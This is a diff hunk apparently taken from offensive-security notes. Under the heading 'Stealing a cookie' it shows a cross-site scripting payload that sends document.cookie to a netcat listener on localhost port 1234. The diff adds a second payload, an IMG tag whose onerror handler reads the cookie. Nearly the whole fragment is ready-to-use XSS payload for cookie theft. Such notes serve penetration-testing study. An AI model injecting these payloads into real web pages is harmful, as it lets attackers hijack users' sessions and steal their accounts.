@@ -28,6 +28,9 @@
 ### Stealing a cookie
 
        <script>new Image ().src="http://localhost:1234/"+document.cookie;</script>
+   or
+       
+       <IMG src=1 onerror=alert(document.cookie)>
     
    netcat listerner
        
